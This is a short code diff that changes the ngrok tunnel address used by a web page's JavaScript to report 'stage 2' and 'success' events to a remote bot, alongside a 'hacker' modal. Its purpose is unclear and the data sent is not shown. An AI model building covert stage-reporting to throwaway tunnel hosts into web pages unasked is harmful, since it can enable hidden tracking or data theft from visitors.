@@ -90,7 +90,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 hackerModal.classList.add('visible');
                 
                 // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 2 ---
-                fetch('https://stranger-bacteria-ladies.ngrok-free.dev/api/stage2', {
+                fetch('https://landlord-frosting-squeamish.ngrok-free.dev/api/stage2', {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
@@ -108,7 +108,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         }
 
                         // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 3 ---
-                        fetch('https://stranger-bacteria-ladies.ngrok-free.dev/api/success', {
+                        fetch('https://landlord-frosting-squeamish.ngrok-free.dev/api/success', {
                             method: 'POST',
                             headers: { 
                                 'Content-Type': 'application/json',
